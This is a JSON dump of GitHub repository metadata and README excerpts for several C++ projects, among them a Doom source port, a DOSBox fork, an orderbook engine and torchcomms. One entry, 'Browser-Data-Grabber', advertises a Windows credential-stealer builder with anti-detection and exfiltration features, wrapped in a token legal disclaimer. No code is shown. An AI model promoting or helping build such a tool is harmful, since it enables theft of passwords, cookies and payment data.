[
  {
    "basic_info": {
      "name": "UZDoom",
      "full_name": "UZDoom/UZDoom",
      "owner": "UZDoom",
      "description": "UZDoom is a feature centric port for all Doom engine games, based on GZDoom, adding an advanced renderer and powerful scripting capabilities",
      "url": "https://github.com/UZDoom/UZDoom",
      "clone_url": "https://github.com/UZDoom/UZDoom.git",
      "ssh_url": "git@github.com:UZDoom/UZDoom.git",
      "homepage": "http://zdoom.org",
      "created_at": "2025-10-14T15:41:42Z",
      "updated_at": "2025-10-27T02:11:35Z",
      "pushed_at": "2025-10-27T01:42:25Z"
    },
    "stats": {
      "stars": 975,
      "forks": 49,
      "watchers": 975,
      "open_issues": 136,
      "size": 177172
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 24420398,
        "C": 8249771,
        "ZenScript": 2069295,
        "CMake": 188191,
        "Yacc": 184472,
        "M4": 171384,
        "GLSL": 122478,
        "Objective-C++": 108232,
        "HTML": 33449,
        "Go": 27816,
        "Objective-C": 17478,
        "Python": 12295,
        "Shell": 8641,
        "SWIG": 4538,
        "JavaScript": 2888,
        "Batchfile": 1629,
        "Assembly": 1399,
        "Makefile": 257
      },
      "license": "GNU General Public License v3.0",
      "topics": []
    },
    "content": {
      "readme": "# Welcome to UZDoom!\n\n[![Continuous Integration](https://github.com/UZDoom/UZDoom/actions/workflows/continuous_integration.yml/badge.svg)](https://github.com/UZDoom/UZDoom/actions/workflows/continuous_integration.yml)\n\n## UZDoom is a modder-friendly OpenGL and Vulkan source port based on the DOOM engine\n\nCopyright (c) 1998-2025 ZDoom + GZDoom + UZDoom teams, and contributors\n\nDoom Source (c) 1997 id Software, Raven Software, and contributors\n\nPlease see license files for individual contributor licenses\n\nSpecial thanks to Coraline of the EDGE team for allowing us to use her [README.md](https://github.com/3dfxdev/EDGE/blob/master/README.md) as a template for this one.\n\n### Source code licensed under the GPL v3\n##### https://www.gnu.org/licenses/quick-guide-gplv3.en.html\n---\n\n## How to build UZDoom\n\nTo build UZDoom, please see UZDoom's Github [wiki](https://github.com/UZDoom/UZDoom/wiki/) for full list.\n\nBuild For [Linux](https://github.com/UZDoom/UZDoom/wiki/Compilation#linux).\n\nBuild For [MacOS](https://github.com/UZDoom/UZDoom/wiki/Compilation#macos).\n\nBuild For [Windows](https://github.com/UZDoom/UZDoom/wiki/Compilation#windows).\n\n# Resources\n- https://zdoom.org/ - Home Page\n- https://forum.zdoom.org/ - Forum\n- https://zdoom.org/wiki/ - Wiki\n- https://dsc.gg/zdoom - Discord Server\n- https://docs.google.com/spreadsheets/d/1pvwXEgytkor9SClCiDn4j5AH7FedyXS-ocCbsuQIXDU/edit?usp=sharing - Translation sheet (Google Docs)\n",
      "default_branch": "trunk"
    },
    "fetched_at": "2025-10-27T02:45:18.518771"
  },
  {
    "basic_info": {
      "name": "clever-forge-586",
      "full_name": "coyer1986/clever-forge-586",
      "owner": "coyer1986",
      "description": null,
      "url": "https://github.com/coyer1986/clever-forge-586",
      "clone_url": "https://github.com/coyer1986/clever-forge-586.git",
      "ssh_url": "git@github.com:coyer1986/clever-forge-586.git",
      "homepage": null,
      "created_at": "2025-10-14T12:55:24Z",
      "updated_at": "2025-10-21T00:30:20Z",
      "pushed_at": "2025-10-14T12:55:26Z"
    },
    "stats": {
      "stars": 382,
      "forks": 0,
      "watchers": 382,
      "open_issues": 0,
      "size": 0
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 95
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# clever-forge-586\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:19.685443"
  },
  {
    "basic_info": {
      "name": "dsa-code",
      "full_name": "ghostmkg/dsa-code",
      "owner": "ghostmkg",
      "description": null,
      "url": "https://github.com/ghostmkg/dsa-code",
      "clone_url": "https://github.com/ghostmkg/dsa-code.git",
      "ssh_url": "git@github.com:ghostmkg/dsa-code.git",
      "homepage": "",
      "created_at": "2025-09-30T03:02:13Z",
      "updated_at": "2025-10-26T19:15:46Z",
      "pushed_at": "2025-10-25T07:25:01Z"
    },
    "stats": {
      "stars": 359,
      "forks": 893,
      "watchers": 359,
      "open_issues": 29,
      "size": 19023
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 884659,
        "Java": 559941,
        "Python": 319588,
        "HTML": 167515,
        "JavaScript": 79625,
        "C": 74830,
        "Go": 40584,
        "Rust": 32427,
        "Ruby": 23287,
        "Kotlin": 19650,
        "TypeScript": 13638,
        "PHP": 10218,
        "Swift": 1102
      },
      "license": "MIT License",
      "topics": [
        "hacktoberfest",
        "hacktoberfest-accepted",
        "hacktoberfest2025"
      ]
    },
    "content": {
      "readme": "# 📘 DSA-Code\n\nWelcome to **DSA-Code** 🎉\nThis repository is a collection of **Data Structures and Algorithms (DSA)** solutions implemented in multiple programming languages.\nThe goal of this repo is to help learners and contributors **explore, practice, and improve** their problem-solving skills in DSA.\n\nWelcome to **DSA-Code** 🎉  \nA community-driven repository of **Data Structures and Algorithms (DSA)** solutions implemented in multiple programming languages.  \nThe goal of this project is to help learners and contributors **explore, practice, and enhance** their problem-solving skills in DSA.  \n\n## 🚀 Features\n\n* 💻 Solutions in multiple programming languages (C, C++, Python, Java, JavaScript, etc.)\n* 🧩 Beginner-friendly problem statements and structured solutions\n* 🌍 Open-source project — everyone is welcome to contribute\n* 💪 Perfect for **Hacktoberfest**, **coding practice**, and **interview preparation**\n* 📂 Each folder contains DSA problems and solutions in the respective programming language\n\n## 🚀 Features  \n- 💡 Solutions in multiple languages — *C, C++, Python, Java, JavaScript,* and more.  \n- 🧑‍💻 Beginner-friendly problem statements with clear, structured solutions.  \n- 🗺️ **Comprehensive DSA Roadmap** to guide your journey.  \n- 🌍 Open-source project — perfect for **Hacktoberfest**, coding practice, and interviews.  \n- 🧩 Each folder contains DSA problems and solutions for the respective programming language.  \n\n---\n\n## 🤝 How to Contribute\n\n---\n\n### 1️⃣ Fork the Repository  \nClick the **Fork** button (top-right) to create your own copy.  \n\n```bash\ngit clone https://github.com/<your-username>/dsa-code.git\ncd dsa-code\n```\n\n### 3️⃣ Create a branch\n\n```bash\ngit checkout -b feature-branch-name\n4️⃣ Add Your Code\n\nNavigate to the correct folder (e.g., Python/, Java/, etc.)\n\nAdd your DSA problem solution file.\n\n### 5️⃣ Commit and push changes\n\n```bash\n\nEnsure proper file naming and comments for clarity.\n5️⃣ Commit and Push Changes\n\ngit add .\ngit commit -m \"Added solution for <problem-name> in <language>\"\ngit push origin feature-branch-name\n6️⃣ Create a Pull Request\n\nGo to the Pull Requests tab on the original repo.\n\nClick on New Pull Request.\n\n### 6️⃣ Raise a Pull Request (PR)\n\nSubmit and wait for review 🚀\n📝 Contribution Guidelines\n\n✅ Write clean, readable, and well-commented code.\n✅ Add only DSA-related problems and solutions.\n✅ Maintain folder structure and avoid duplicates.\n🚫 Do not copy-paste code without proper reference or attribution.\n📢 Join Our Community\n\nBe a part of our growing community 🌱 — learn, code, and grow together!\n\n💬 Join on Discord\n\n📢 Join on Telegram\n\n💼 Follow on LinkedIn\n\n💬 Join our WhatsApp Community\n\n📺 Subscribe on YouTube\n\n🐦 Follow on Twitter\n\n📸 Follow on Instagram\n☕ Support the Project\n\nIf you love this project and want to support future development, consider buying us a coffee:\n\n<a href=\"https://www.buymeacoffee.com/mgoshwami1c\"> <img src=\"https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png\" height=\"50\" width=\"210\" alt=\"Buy Me A Coffee\"> </a>\n🏷️ GitHub Badges\n---\n\n## 🏷️ GitHub Badges  \n\n![GitHub Repo stars](https://img.shields.io/github/stars/ghostmkg/dsa-code?style=for-the-badge)  \n![GitHub forks](https://img.shields.io/github/forks/ghostmkg/dsa-code?style=for-the-badge)  \n![GitHub issues](https://img.shields.io/github/issues/ghostmkg/dsa-code?style=for-the-badge)  \n![GitHub pull requests](https://img.shields.io/github/issues-pr/ghostmkg/dsa-code?style=for-the-badge)  \n![GitHub license](https://img.shields.io/github/license/ghostmkg/dsa-code?style=for-the-badge)  \n![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=for-the-badge)  \n\n---\n\n**Happy Coding! 🚀**\n\n\n\nHappy Coding! 🚀\n\n---\n\n### 🔚 Last Step:\n1. Jab ye content paste kar lo, to niche **\"Mark as resolved\"** button pe click karo.  \n2. Phir “**Commit merge**” pe click karo.  \n\nBas ho gaya 🎉  \nAb tera PR **conflict-free** ho gaya hai aur Hacktoberfest ke liye **valid contribution** count ho jayega ✅  \n\n---\n\nChahe to tu mujhe ek screenshot bhej de editor ka (jab paste kar lega) — main confirm kar dunga ki sab perfect hai aur merge safe hai 👌\n\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:20.802866"
  },
  {
    "basic_info": {
      "name": "dosbox-pure-unleashed",
      "full_name": "schellingb/dosbox-pure-unleashed",
      "owner": "schellingb",
      "description": "DOSBox reimagined, with a friendly interface, ZIP loading and save states",
      "url": "https://github.com/schellingb/dosbox-pure-unleashed",
      "clone_url": "https://github.com/schellingb/dosbox-pure-unleashed.git",
      "ssh_url": "git@github.com:schellingb/dosbox-pure-unleashed.git",
      "homepage": null,
      "created_at": "2025-10-18T16:33:32Z",
      "updated_at": "2025-10-27T01:27:10Z",
      "pushed_at": "2025-10-26T18:49:57Z"
    },
    "stats": {
      "stars": 331,
      "forks": 12,
      "watchers": 331,
      "open_issues": 22,
      "size": 360
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 185163,
        "C": 3454,
        "Makefile": 2527
      },
      "license": "GNU General Public License v2.0",
      "topics": []
    },
    "content": {
      "readme": "# DOSBox Pure Unleashed\nDOSBox Pure is a fork of [DOSBox](https://www.dosbox.com/),\nan emulator for DOS games, aiming for simplicity and ease of use.\nThis project is a standalone version for desktop platforms of the [libretro core](../dosbox-pure).\n\n![Logo](images/logo.png)\n\n## Download\nYou can download the latest version of DOSBox Pure on [itch.io](https://schelling.itch.io/dosbox-pure) or from the [Releases page here](https://github.com/schellingb/dosbox-pure-unleashed/releases/latest).\n\nJust extract the ZIP file and then run DOSBoxPure.exe.\n\n### Donations\nTips and donations are welcome, either through the [itch.io page](https://schelling.itch.io/dosbox-pure)\nor the Sponsor button at the top of the [GitHub repository](https://github.com/schellingb/dosbox-pure-unleashed).\n\nThank you for your consideration!\n\n## Loading Content\nDOSBox Pure can load ZIP files, CD images (ISO or CUE), floppy/hard disk images (IMG/IMA/VHD/JRC/TC), DOS executable files (EXE/BAT/COM),\nlegacy DOSBox .conf files or folders directly. It also loads .DOSZ files which are just .ZIP files with a different extension.\n\nThere are 3 ways to load content. After startup, you can use the \"Load Content\" menu option to navigate to the file you want to load.\nAlternatively you can drag & drop a supported file onto the program window (after starting) or onto the program's icon (before starting).\n\n## Hotkeys\nA few system functions are bound to various F-keys, accessible while holding the hotkey modifier which by default is the Control key.\nThe hotkey modifier can be changed in the [System Settings](#system-settings). These are the hotkeys:\n\n| Key | Description                                     |\n|-----|-------------------------------------------------|\n| F1  | Pause/Resume (F12 to step a frame while paused) |\n| F2  | Slow Motion                                     |\n| F3  | Fast Forward                                    |\n| F5  | Save State Quick Save                           |\n| F7  | Switch Full Screen and Windowed Mode            |\n| F9  | Save State Quick Load                           |\n| F11 | Lock Mouse to Window                            |\n| F12 | Toggle On-Screen Menu                           |\n\nUse the `General > Fast Forward/Slow Motion Mode` setting to swap between holding or toggling mode.\n\nIn addition, you can set the `General > Middle Mouse Button Open Menu` setting for easier access to the menu.\n\n## Features\n\n### Load Games from ZIP\nDOSBox Pure can load games directly from ZIP files without the need to extract them.\n\n### Store Modifications in Separate Save File\nChanges made to a loaded ZIP file will be stored as a separate ZIP file into the saves directory.  \nIf a game is loaded directly without using a container like ZIP or ISO the saves directory is not used.\n\n### Mount Disk Images from Inside ZIP Files\nCD images (ISO or CUE) and floppy disk images (IMG/IMA/VHD/JRC/TC) can be mounted directly from inside ZIP files.  \nThe system will automatically mount the first found disk image as the A: or D: drive.  \nAdditional disks can be loaded or swapped by using the [start menu](#start-menu).\n\n### Start Menu\n![Start Menu](images/startmenu.png)\n\nThis is the first screen that appears after loading a game. It offers a gamepad controllable list\nwith all executable files of the loaded game. In addition it can load new content and swap which floppy disk or CD is inserted.\n\nBy using the tabs at the bottom, you can view the [Gamepad Mapper](#gamepad-mapper), the [System Settings](#system-settings)\nand while a game is running access the [On-Screen Keyboard](#on-screen-keyboard).\n\nWhile a game is running, you can open the menu again by pressing CTRL+F12 or L3 on the gamepad (usually by pushing in the left analog stick).\nThe keyboard hotkey can be modified in the [System Settings](#system-settings) and the gamepad button can be changed in the [Gamepad Mapper](#gamepad-mapper).\n\n### System Settings\nBy switching to the SYSTEM tab in the [start menu](#start-menu) you will find all program and emulation settings divided into various categories.\nEach setting has a list of options and a detailed description next to it.\n\n### Auto Start\nWhile in the [start menu](#start-menu), you can press right to set an item as the default which will skip the menu the next time the same content is loaded.\nBy pressing right multiple times, a number of frames can be specified that will automatically be skipped on start.\nThis can be used to skip over loading screens or start-up sequences.  \nIf there is only a single choice, the menu will not show and directly run the only executable file.\n\n### On-Screen Keyboard\n![On-Screen Keyboard](images/onscreenkeyboard.png)\n\nBy pressing L3 on the gamepad (usually by pushing in the left analog stick) the menu will open.\nThen you can use the L and R buttons to switch to the On-screen keyboard tab. It is also possible to use the \n`Input > Use L3 Button to Show Menu` option to default to the keyboard when first pressing L3.\nThe cursor ",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:21.939867"
  },
  {
    "basic_info": {
      "name": "orderbook-simulator-cpp",
      "full_name": "SLMolenaar/orderbook-simulator-cpp",
      "owner": "SLMolenaar",
      "description": "A high-performance C++ orderbook engine with microsecond-level latency, supporting multiple ordertypes, price-time priority matching and real time data integration from Binance",
      "url": "https://github.com/SLMolenaar/orderbook-simulator-cpp",
      "clone_url": "https://github.com/SLMolenaar/orderbook-simulator-cpp.git",
      "ssh_url": "git@github.com:SLMolenaar/orderbook-simulator-cpp.git",
      "homepage": "",
      "created_at": "2025-09-30T23:54:28Z",
      "updated_at": "2025-10-25T14:45:24Z",
      "pushed_at": "2025-10-23T14:15:48Z"
    },
    "stats": {
      "stars": 209,
      "forks": 58,
      "watchers": 209,
      "open_issues": 2,
      "size": 114
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 63386,
        "C": 2925,
        "CMake": 2204
      },
      "license": "MIT License",
      "topics": [
        "cpp",
        "high-performance",
        "orderbook",
        "quantitative-finance"
      ]
    },
    "content": {
      "readme": "# High-Performance Order Book Engine\n\nA low-latency limit order book implementation in C++20 with real-time market data integration. Built to handle\nhigh-frequency trading workloads with microsecond-level latency.\n\n## Overview\n\nThis project implements a matching engine and order book that supports multiple order types, priority-based matching,\nand real-time market data processing. The architecture is designed for performance-critical applications where latency\nmatters.\n\n**Key metrics:**\n\n- Order insertion: ~400,000 orders/sec\n- Order matching: ~350,000 matches/sec\n- Order cancellation: ~2,000,000 cancels/sec\n- Average operation latency: 2-4 μs\n\n## Features\n\n### Core Order Book\n\n- **Order Types**: GoodTillCancel, Market, ImmediateOrCancel, FillOrKill, GoodForDay\n- **Matching Algorithm**: Price-time priority (FIFO within price levels)\n- **Data Structures**: O(1) order lookup, O(log n) price level access\n- **Trade Execution**: Automatic matching with partial fill support\n\n### Market Data Feed\n\n- Real-time orderbook snapshots via Binance REST API\n- Incremental update processing (new orders, cancellations, modifications)\n- Batch message processing for improved throughput\n- Sequence number tracking for gap detection\n- Latency monitoring and statistics\n\n### Live Market Display\n\n- Real-time visualization of cryptocurrency orderbooks\n- Configurable refresh rates and depth levels\n- Bid-ask spread analysis and mid-price calculation\n- Market microstructure metrics\n\n<img width=\"511\" height=\"930\" alt=\"image\" src=\"https://github.com/user-attachments/assets/12dabc82-3a85-4cf9-8198-379178578fc4\" />\n\n## Build Instructions\n\n### Requirements\n\n- CMake 3.10+\n- C++20 compatible compiler (GCC 10+, Clang 10+, MSVC 2019+)\n- Dependencies (automatically fetched via CMake):\n- libcurl 8.4.0\n- nlohmann/json 3.11.3\n\n### Build\n\n```bash\nmkdir build && cd build\ncmake ..\ncmake --build . --config Release\n```\n\n### Run\n\n```bash\n# Run functionality and performance tests\n./OrderBookTests\n\n# Live cryptocurrency orderbook\n./LiveMarketData SOLUSDT 1 20\n# Args: [SYMBOL] [REFRESH_SECONDS] [DEPTH_LEVELS]\n```\n\n## Architecture\n\n### Class Diagram\n\n```mermaid\nclassDiagram\n    %% Core Type Aliases\n    class Types {\n        <<typedef>>\n        +Price: int32_t\n        +Quantity: uint32_t\n        +OrderId: uint64_t\n    }\n\n    %% Enumerations\n    class OrderType {\n        <<enumeration>>\n        GoodTillCancel\n        ImmediateOrCancel\n        Market\n        GoodForDay\n        FillOrKill\n    }\n\n    class Side {\n        <<enumeration>>\n        Buy\n        Sell\n    }\n\n    class MessageType {\n        <<enumeration>>\n        NewOrder\n        CancelOrder\n        ModifyOrder\n        Trade\n        BookSnapshot\n    }\n\n    %% Constants\n    class Constants {\n        <<static>>\n        +InvalidPrice: Price\n    }\n\n    %% Order Classes\n    class Order {\n        -orderType_: OrderType\n        -orderId_: OrderId\n        -side_: Side\n        -price_: Price\n        -initialQuantity_: Quantity\n        -remainingQuantity_: Quantity\n        +Order(OrderType, OrderId, Side, Price, Quantity)\n        +Order(OrderId, Side, Quantity)\n        +GetOrderId(): OrderId\n        +GetSide(): Side\n        +GetPrice(): Price\n        +GetOrderType(): OrderType\n        +GetInitialQuantity(): Quantity\n        +GetRemainingQuantity(): Quantity\n        +GetFilledQuantity(): Quantity\n        +IsFilled(): bool\n        +Fill(Quantity): void\n        +ToGoodTillCancel(Price): void\n    }\n\n    class OrderModify {\n        -orderId_: OrderId\n        -price_: Price\n        -side_: Side\n        -quantity_: Quantity\n        +OrderModify(OrderId, Side, Price, Quantity)\n        +GetOrderId(): OrderId\n        +GetPrice(): Price\n        +GetSide(): Side\n        +GetQuantity(): Quantity\n        +ToOrderPointer(OrderType): OrderPointer\n    }\n\n    %% Trade Classes\n    class TradeInfo {\n        +orderId_: OrderId\n        +price_: Price\n        +quantity_: Quantity\n    }\n\n    class Trade {\n        -bidTrade_: TradeInfo\n        -askTrade_: TradeInfo\n        +Trade(TradeInfo, TradeInfo)\n        +GetBidTrade(): TradeInfo\n        +GetAskTrade(): TradeInfo\n    }\n\n    %% Level Info Classes\n    class LevelInfo {\n        +price_: Price\n        +quantity_: Quantity\n    }\n\n    class OrderbookLevelInfos {\n        -bids_: LevelInfos\n        -asks_: LevelInfos\n        +OrderbookLevelInfos(LevelInfos, LevelInfos)\n        +GetBids(): LevelInfos\n        +GetAsks(): LevelInfos\n    }\n\n    %% Market Data Messages\n    class NewOrderMessage {\n        +type: MessageType\n        +orderId: OrderId\n        +side: Side\n        +price: Price\n        +quantity: Quantity\n        +orderType: OrderType\n        +timestamp: time_point\n    }\n\n    class CancelOrderMessage {\n        +type: MessageType\n        +orderId: OrderId\n        +timestamp: time_point\n    }\n\n    class ModifyOrderMessage {\n        +type: MessageType\n        +orderId: OrderId\n        +side: Side\n        +newPrice: Price\n        +newQuantity: Quantity\n        +timestamp: time_point\n    }",
      "default_branch": "master"
    },
    "fetched_at": "2025-10-27T02:45:23.103486"
  },
  {
    "basic_info": {
      "name": "hyprlauncher",
      "full_name": "hyprwm/hyprlauncher",
      "owner": "hyprwm",
      "description": "A multipurpose and versatile launcher / picker for Hyprland",
      "url": "https://github.com/hyprwm/hyprlauncher",
      "clone_url": "https://github.com/hyprwm/hyprlauncher.git",
      "ssh_url": "git@github.com:hyprwm/hyprlauncher.git",
      "homepage": "https://wiki.hypr.land/Hypr-Ecosystem/hyprlauncher/",
      "created_at": "2025-10-07T15:41:37Z",
      "updated_at": "2025-10-27T02:21:50Z",
      "pushed_at": "2025-10-26T19:17:43Z"
    },
    "stats": {
      "stars": 173,
      "forks": 9,
      "watchers": 173,
      "open_issues": 5,
      "size": 83
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 57221,
        "Nix": 4637,
        "CMake": 2810
      },
      "license": "BSD 3-Clause \"New\" or \"Revised\" License",
      "topics": []
    },
    "content": {
      "readme": "## hyprlauncher\nA multipurpose and versatile launcher / picker for Hyprland\n\n![](./assets/preview.png)\n\n## Features\n\n- Various providers: Desktop, Unicode, Emoji, Math ...\n- Speedy: Fast, multi-threaded fuzzy searching\n- Daemon by default: instant opening of the launcher\n- Entry frequency caching: commonly used entries appear above others\n- Manual entry providing: make a simple selector from your own list\n\n## Runtime dependencies\n\n- Desktop: none\n- Unicode: `wl-copy`\n- Math: `wl-copy` for copying the result\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:24.197415"
  },
  {
    "basic_info": {
      "name": "Browser-Data-Grabber",
      "full_name": "sankha-ghosh/Browser-Data-Grabber",
      "owner": "sankha-ghosh",
      "description": "Stealer for Windows 10/11 for Chrome, Edge, Firefox, Brave with Wallet, Discord, Telegram and many more functions. Passwords, cookies, autofills, payments, etc.",
      "url": "https://github.com/sankha-ghosh/Browser-Data-Grabber",
      "clone_url": "https://github.com/sankha-ghosh/Browser-Data-Grabber.git",
      "ssh_url": "git@github.com:sankha-ghosh/Browser-Data-Grabber.git",
      "homepage": null,
      "created_at": "2025-10-15T01:39:53Z",
      "updated_at": "2025-10-27T02:11:41Z",
      "pushed_at": "2025-10-27T02:11:38Z"
    },
    "stats": {
      "stars": 164,
      "forks": 13,
      "watchers": 164,
      "open_issues": 1,
      "size": 170
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 164694,
        "Batchfile": 11310,
        "Shell": 1970,
        "C": 1419,
        "CMake": 1354
      },
      "license": "Other",
      "topics": [
        "app-bound",
        "autofills",
        "brave",
        "chrome",
        "cookies",
        "credit-card",
        "edge",
        "encryption",
        "exploit",
        "firefox",
        "fud",
        "grabber",
        "malware",
        "passwords",
        "payments",
        "stealer",
        "undetectable",
        "wallet",
        "windows"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n# 🥷 Stealer - Windows 10/11\n\n<div align=\"center\">\n\n### **The Ultimate Data Extraction & Payload Generation Tool**\n\n**Build powerful Windows stealers with advanced anti-detection capabilities**\n\n*Professional-grade malware builder for red team operations and penetration testing*\n\n</div>\n\n---\n\n<div align=\"center\">\n\n[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)\n[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-blue.svg)](#installation)\n[![Features](https://img.shields.io/badge/features-50+-green.svg)](#-stealer-capabilities)\n[![Anti-Detection](https://img.shields.io/badge/anti--detection-Advanced-orange.svg)](#-anti-detection-features)\n[![Build Status](https://img.shields.io/badge/build-Passing-brightgreen.svg)](#-building--usage)\n[![Version](https://img.shields.io/badge/version-2.0-purple.svg)](#)\n\n</div>\n\n---\n\n<div align=\"center\">\n\n### 🎯 **Quick Navigation**\n\n[![Quick Start](https://img.shields.io/badge/🚀_Quick_Start-Get_Started_Now-brightgreen.svg?style=for-the-badge)](#-quick-start)\n[![Features](https://img.shields.io/badge/💎_Features-50+_Capabilities-blue.svg?style=for-the-badge)](#-stealer-capabilities)\n[![Installation](https://img.shields.io/badge/🛠️_Installation-One_Click_Setup-orange.svg?style=for-the-badge)](#installation)\n[![Usage](https://img.shields.io/badge/📖_Usage-Professional_GUI-purple.svg?style=for-the-badge)](#-building--usage)\n\n</div>\n\n</div>\n\n---\n\n<div align=\"center\">\n\n## ⚠️ **LEGAL WARNING & DISCLAIMER**\n\n<div style=\"background-color: #ff4444; color: white; padding: 20px; border-radius: 10px; margin: 20px 0;\">\n\n### 🚨 **THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY** 🚨\n\n</div>\n\n</div>\n\n<div align=\"center\">\n\n> **🔴 CRITICAL NOTICE:** This software is designed exclusively for legal, authorized security testing purposes.\n\n</div>\n\n---\n\n<div align=\"center\">\n\n### ✅ **Intended Use Cases**\n\n<table>\n<tr>\n<td width=\"25%\">\n\n#### 🎯 **Penetration Testing**\n- Authorized engagements\n- Written permission required\n- Scope-defined testing\n\n</td>\n<td width=\"25%\">\n\n#### 🔴 **Red Team Operations**\n- Client authorization\n- Controlled environments\n- Professional assessments\n\n</td>\n<td width=\"25%\">\n\n#### 🔬 **Security Research**\n- Controlled lab environments\n- Academic institutions\n- Authorized studies\n\n</td>\n<td width=\"25%\">\n\n#### 🎓 **Educational Use**\n- Academic settings\n- Training programs\n- Learning purposes\n\n</td>\n</tr>\n</table>\n\n</div>\n\n---\n\n<div align=\"center\">\n\n<div style=\"background-color: #2d5a27; color: white; padding: 15px; border-radius: 8px; margin: 20px 0;\">\n\n### 🛡️ **USE ETHICALLY • USE RESPONSIBLY • USE LEGALLY** 🛡️\n\n</div>\n\n</div>\n\n---\n\n<div align=\"center\">\n\n## 📋 **Table of Contents**\n\n</div>\n\n<div align=\"center\">\n\n<table>\n<tr>\n<td width=\"50%\">\n\n### 🚀 **Getting Started**\n- [🚀 Quick Start](#-quick-start) - Get up and running in minutes\n- [💎 Stealer Capabilities](#-stealer-capabilities) - 50+ powerful features\n- [🛠️ Installation](#installation) - One-click setup process\n- [🔨 Building & Usage](#-building--usage) - Professional GUI interface\n\n</td>\n<td width=\"50%\">\n\n### 📖 **Advanced Topics**\n- [📝 Real-World Configurations](#-real-world-stealer-configurations) - Professional examples\n- [🛡️ Security Considerations](#-security-considerations) - Best practices\n- [🔧 Troubleshooting](#-troubleshooting) - Common issues & solutions\n- [🏗️ Architecture](#-architecture) - Technical deep dive\n\n</td>\n</tr>\n<tr>\n<td width=\"50%\">\n\n### 👥 **Community**\n- [💻 Development](#-development) - Contributing guidelines\n- [🤝 Contributing](#-contributing) - How to help\n\n</td>\n<td width=\"50%\">\n\n### 📚 **Resources**\n- [📚 Resources](#-resources) - Learning materials & tools\n\n</td>\n</tr>\n</table>\n\n</div>\n\n---\n\n<div align=\"center\">\n\n## ⭐ **Why Choose Stealer Builder?**\n\n</div>\n\n<div align=\"center\">\n\n<table>\n<tr>\n<td width=\"33%\" style=\"background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #007bff;\">\n\n### 🎯 **Professional-Grade Features**\n\n<div style=\"background-color: #0f1a2a; padding: 15px; border-radius: 8px; margin: 10px 0;\">\n\n- **50+ Stealer Capabilities** - Comprehensive data extraction\n- **Advanced Anti-Detection** - Evade modern security solutions\n- **Cross-Platform Builder** - Linux → Windows compilation\n- **One-Click Generation** - No coding required\n- **Real-Time Exfiltration** - Instant data delivery\n\n</div>\n\n</td>\n<td width=\"33%\" style=\"background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #28a745;\">\n\n### 🥷 **Stealth & Evasion**\n\n<div style=\"background-color: #0f1a0f; padding: 15px; border-radius: 8px; margin: 10px 0;\">\n\n- **Hidden Execution** - Completely invisible to users\n- **Process Masquerading** - Disguise as system processes\n- **VM Detection** - Evade virtual environments\n- **Sandbox Evasion** - Bypass automated analysis\n- **Anti-Debugging** - Prevent reverse engineering\n\n</div>\n\n</td>\n<td width=\"33%\" style=\"background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px s",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:25.309918"
  },
  {
    "basic_info": {
      "name": "torchcomms",
      "full_name": "meta-pytorch/torchcomms",
      "owner": "meta-pytorch",
      "description": "torchcomms: a modern PyTorch communications API",
      "url": "https://github.com/meta-pytorch/torchcomms",
      "clone_url": "https://github.com/meta-pytorch/torchcomms.git",
      "ssh_url": "git@github.com:meta-pytorch/torchcomms.git",
      "homepage": "https://meta-pytorch.org/torchcomms/",
      "created_at": "2025-10-20T20:18:00Z",
      "updated_at": "2025-10-26T21:50:18Z",
      "pushed_at": "2025-10-26T18:51:14Z"
    },
    "stats": {
      "stars": 162,
      "forks": 15,
      "watchers": 162,
      "open_issues": 5,
      "size": 6748
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 8250103,
        "C": 773192,
        "Python": 440864,
        "Cuda": 426778,
        "Makefile": 39258,
        "Shell": 35026,
        "CMake": 14693,
        "Thrift": 11939
      },
      "license": "BSD 3-Clause \"New\" or \"Revised\" License",
      "topics": []
    },
    "content": {
      "readme": "<p align=\"center\">\n  <picture>\n    <source media=\"(prefers-color-scheme: dark)\" srcset=\"logo-dark.png\">\n    <img width=\"55%\" src=\"logo-light.png\" alt=\"torchcomms\">\n  </picture>\n</p>\n\n\n# torchcomms\n\ntorchcomms is a new experimental communications API for PyTorch. This provides\nboth the high level collectives API as well as several out of the box backends.\n\n* [Documentation](https://meta-pytorch.org/torchcomms/main/index.html)\n* [Examples](./comms/torchcomms/examples)\n\n## Prerequisites\n\ntorchcomms requires the following software and hardware:\n\n- Python 3.10 or higher\n- PyTorch 2.8 or higher\n- CUDA-capable GPU (for NCCL/NCCLX or RCCL backends)\n\n## Installation\n\ntorchcomms is available on PyPI and can be installed using pip. Alternatively,\nyou can build torchcomms from source.\n\n### Using pip (Nightly Builds)\n\nYou can install torchcomms and PyTorch nightly builds using pip:\n\n```bash\npip install --pre torch torchcomms --index-url https://download.pytorch.org/whl/nightly/cu128\n```\n\n### Building from Source\n\n#### Prerequisites\n\n- CMake 3.22 or higher\n- Ninja 1.10 or higher\n\nAlternatively, you can build torchcomms from source. If you want to build the NCCLX backend, we recommend building it under a virtual conda environment.\nRun the following commands to build and install torchcomms:\n\n```bash\n# Create a conda environment\nconda create -n torchcomms python=3.10\nconda activate torchcomms\n# Clone the repository\ngit clone git@github.com:meta-pytorch/torchcomms.git\ncd torchcomms\n```\n\n#### Build the backend (choose one based on your hardware):\n\n##### Standard NCCL Backend\n\nNo build needed - uses the library provided by 